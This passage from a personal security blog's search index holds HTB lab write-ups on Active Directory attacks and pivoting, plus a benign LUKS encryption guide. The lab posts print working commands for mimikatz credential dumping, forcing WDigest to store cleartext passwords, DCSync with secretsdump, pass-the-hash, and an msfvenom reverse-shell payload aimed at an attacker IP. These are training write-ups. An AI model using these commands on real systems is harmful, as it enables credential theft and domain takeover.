/u:\u0026#34;inlanefreight\\\u0026lt;user\u0026gt;\u0026#34; /p:\u0026#39;\u0026lt;password\u0026gt;\u0026#39; /drive:Shared,/opt/test I first ran Inveigh to find anything interesting, but nothing.. So, I went with mimikatz and ran:\nprivilege::debug sekurlsa::logonpasswords we get this user t***** on Domain DC01 which is the answer, Moving on to next question.. Question 6 - Submit this user\u0026rsquo;s cleartext password. We did get the user, but the password is shown as none as you see from the above image, to get the password we have to force WDigest to store credentials in plaintext. We have to modify below registry to achieve that, and we have to reboot, so that we get the cleartext password5 :\nreg add HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest /v UseLogonCredential /t REG_DWORD /d 1 After restarting we get the cleartext password : Question 7 - What attack can this user perform? I was thinking what could be attack and just casually gave DCsync as an answer and it was correct.. Now we have to find why? for that we can use PowerView6\nImport-Module .\\PowerView.ps1 Get-DomainUser -Identity \u0026lt;user\u0026gt; |select samaccountname,objectsid,memberof,useraccountcontrol | fl $sid = \u0026#34;S-1...\u0026#34; Get-ObjectAcl \u0026#34;DC=inlanefreight,DC=local\u0026#34; -ResolveGUIDs | ? { ($_.ObjectAceType -match \u0026#39;Replication-Get\u0026#39;)} | ?{$_.SecurityIdentifier -match $sid} |select AceQualifier, ObjectDN, ActiveDirectoryRights,SecurityIdentifier,ObjectAceType | fl As from the above image we can see that DS-Replication-Get-Changes-In-Filtered-Set, DS-Replication-Get-Changes, DS-Replication-Get-Changes-All are present, which allows user to access replication data from AD database. Thus allowing us to perform DCsync attack. Question 8 - Take over the domain and submit the contents of the flag.txt file on the Administrator Desktop on DC01 We can use Runas to login as t***** user, now let\u0026rsquo;s just dump the hashes of Administrator using impacket-secretsdump, we can get DC01 IP, by pinging it like we did it before:\nproxychains impacket-secretsdump -outputfile inlanefreight_hashes -just-dc INLANEFREIGHT/\u0026lt;user\u0026gt;@\u0026lt;ip\u0026gt; Now that we got the hash, we can pass the hash using crackmapexec and get the final flag!!\nproxychains crackmapexec smb \u0026lt;ip\u0026gt; -u Administrator -H \u0026lt;hash\u0026gt; -x \u0026#39;type C:\\Users\\Administrator\\Desktop\\flag.txt\u0026#39; Kerberoasting - from Windows \u0026#160;\u0026#x21a9;\u0026#xfe0e;\nUsing PowerView to Target a Specific User \u0026#160;\u0026#x21a9;\u0026#xfe0e;\nEstablishing WinRM Session from Windows \u0026#160;\u0026#x21a9;\u0026#xfe0e;\nConnect to a FreeRDP server with a shared directory \u0026#160;\u0026#x21a9;\u0026#xfe0e;\nForcing WDigest to Store Credentials in Plaintext \u0026#160;\u0026#x21a9;\u0026#xfe0e;\nUsing Get-DomainUser to View a User Group Membership \u0026#160;\u0026#x21a9;\u0026#xfe0e;\n", 
        "url": "http:\/\/localhost:1313\/posts\/ad_enumeration__attacks_-_skills_assessment_part_i\/"
    },
    
    "http:\/\/localhost:1313\/about\/": {
        "title": "About Me",
        "tags": [],
        "content": "VAMSI(1) \u0026ndash; USER MANUAL NAME Vamsi \u0026ndash; Software Engineer | Security Enthusiast\nSYNOPSIS vamsi [ --code ] [ --infrastructure ] [ --security ]\nDESCRIPTION Vamsi is a software engineer with a passion for building robust systems and exploring the world of cybersecurity. Enjoys tackling complex problems and learning new technologies.\nOPTIONS --languages üíª\nPython, Rust, C, Bash, SQL --infrastructure ‚öôÔ∏è\nKafka, Kubernetes, Docker, Git --security üõ°Ô∏è\nLinux Hardening, Network Security, CTFs --currently-exploring üî≠\nNetwork Programming, History, Philosophy Malware Analysis, Red Teaming, Emerging Cybersec Areas --contact üìß\nEmail: contact.vamshi99@gmail.com SEE ALSO GitHub Profile üîó ", 
        "url": "http:\/\/localhost:1313\/about\/"
    },
    
    "http:\/\/localhost:1313\/posts\/using_cryptsetup_to_encrypt_partitions\/": {
        "title": "Encrypting Partitions with LUKS using cryptsetup: A Guide",
        "tags": ["guide",],
        "content": "Prerequisites Administrative (sudo) privileges A backup of any existing data on the target partition The partition you want to encrypt (in this guide, we\u0026rsquo;ll use /dev/sdb2) Installing cryptsetup Choose the appropriate command for your distribution:\nFor Debian/Ubuntu:\nsudo apt-get install cryptsetup For distributions using pacman:\nsudo pacman -Sy cryptsetup Encryption Process 1. Initialize LUKS Encryption ‚ö†Ô∏è WARNING: Before we proceed, please make sure you have a BACKUP OF THE DATA somewhere.\nInitialize the LUKS encryption on your partition:\ncryptsetup -y -v luksFormat /dev/sdb2 This command will initialize the partition and will prompt for a passphrase. Please make sure you note the passphrase for further use. 2. Open the Encrypted Partition Create a mapping for the encrypted partition:\ncryptsetup luksOpen /dev/sdb2 test Running the following command will prompt for the passphrase you just created. After successful authentication, the encrypted partition will be available at /dev/mapper/test.\n3. Verify the Setup Check the status of your encrypted mapping:\ncryptsetup -v status test To view detailed LUKS header information:\ncryptsetup luksDump /dev/sdb2 4. Secure the Partition Fill the entire encrypted volume with zeros to ensure secure initialization:\npv -tpreb /dev/zero | dd of=/dev/mapper/test bs=128M This step will:\nOverwrites the entire partition with zeros This may take some time depending on the size of your device/partition, so we have used the pv command to monitor the progress. 5. Create a File System Format the encrypted partition with ext4 or any file system:\nmkfs.ext4 /dev/mapper/test 6. Mount and Verify Create a mount point and mount the encrypted partition:\nsudo mkdir /test_device sudo mount /dev/mapper/test /test_device df -H Usage Tips Always keep your passphrase in a secure location\nConsider creating a backup of the LUKS header\nRemember to close the encrypted partition when not in use:\nsudo umount /test_device cryptsetup luksClose test Note: Whenever you see a guide in my blog, they are primarily for my personal documentation, or I am sharing them in hope they might be useful.\n", 
        "url": "http:\/\/localhost:1313\/posts\/using_cryptsetup_to_encrypt_partitions\/"
    },
    
    "http:\/\/localhost:1313\/tags\/guide\/": {
        "title": "Guide",
        "tags": [],
        "content": "", 
        "url": "http:\/\/localhost:1313\/tags\/guide\/"
    },
    
    "http:\/\/localhost:1313\/posts\/pivotingtunnelingand_portforwarding-skill_assessment\/": {
        "title": "Pivoting, Tunneling, and Port Forwarding - Skill Assessment",
        "tags": ["htb","cybersec",],
        "content": "Initial Access Reconnaissance As from the objectives of the assessment, we start from the webshell, found two user accounts in the /home directory:\nWebadmin: Primary target for initial access Administrator: Potential privilege escalation target Only webadmin was accessible Critical Findings A private SSH key belonging to the webadmin user A file named \u0026ldquo;for-admin-eyes-only\u0026rdquo; containing credentials Reverse Shell Using Metasploit Payload Generation msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=\u0026lt;attacker_ip\u0026gt; -f elf -o payload LPORT=8080 Payload Delivery python3 -m http.server Metasploit Listener Configuration use exploit/multi/handler set LHOST 0.0.0.0 set LPORT 8080 set payload linux/x64/meterpreter/reverse_tcp Network Enumeration Network Discovery Performed ping sweep and found the internal IP 172.16.5.35: run post/multi/gather/ping_sweep RHOSTS=172.16.5.0/23 Dynamic Tunneling Using SSH As We found the private key to webadmin, we can Dynamic Port Forward using ssh(or use Metasploit as an Socks Proxy): ssh -i id_rsa -D 9050 webadmin@\u0026lt;target_ip\u0026gt; Lateral Movement Used Proxychains to login with discovered credentials Located first flag Privilege Escalation Next the question was what user was vulnerable?, We can tell the user \u0026lsquo;vfrank\u0026rsquo;(I just checked the users folder, so I just submitted it as user), now we have to how this user is vulnerable.. well one obvious answer would be active directory(LSASS) so I just copied mimikatz and ran it. privilege::debug sekurlsa::logonpasswords Confirmed vulnerable user account: vfrank Successfully extracted cleartext passwords Network Enumeration Scanned for additional systems: for /L %i in (1 1 254) do ping 172.16.6.%i -n 1 -w 100 | find \u0026#34;Reply\u0026#34; Located target IP: 172.16.6.25 Established RDP connection with the credentials. Final Access Flag Retrieval Located flag in C:\\ Domain Controller Access Successfully identified the domain controller Retrieved the final flag ", 
        "url": "http:\/\/localhost:1313\/posts\/pivotingtunnelingand_portforwarding-skill_assessment\/"
    },
    
    "http:\/\/localhost:1313\/categories\/": {
        "title": "Categories",
        "tags": [],
        "content": "", 
        "url": "http:\/\/localhost:1313\/categories\/"
    },
    
}
</script>
<script defer src="/js/lunr.js"></script>
<script defer src="/js/search.js"></script>

</footer>

</body>
</html>

